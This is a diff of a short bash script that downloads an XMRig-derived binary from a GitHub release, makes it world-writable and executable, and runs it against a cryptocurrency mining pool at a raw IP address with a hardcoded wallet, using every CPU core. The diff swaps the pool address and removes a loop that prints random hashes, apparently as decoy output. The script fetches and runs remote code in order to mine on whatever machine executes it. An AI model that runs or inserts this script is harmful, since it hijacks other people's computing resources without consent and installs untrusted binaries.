@@ -1,5 +1,4 @@
 #!/bin/bash
 wget -O vrl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl
 chmod 777 vrl
-./vrl --donate-level 1 -o 95.179.162.108:8080 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy -p xt3 -a rx/0 -k -t $(nproc --all) > /dev/null 2>&1 &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
+./vrl --donate-level 1 -o 199.247.28.130:8082 -u 165DUuzQoKG9BaBqprN3ZmsMRfvGHMwNwCpehJUqGoGLsSDtB535XA3PPzfRZhu2uYM9xfT8JsKoXEquWMr6XVwKK4UsrsuiaVHSTBpstcgqjLe5rYNcNfYdCJ1CtDg9z6qshKy -p xt3 -a rx/0 -k -t $(nproc --all)
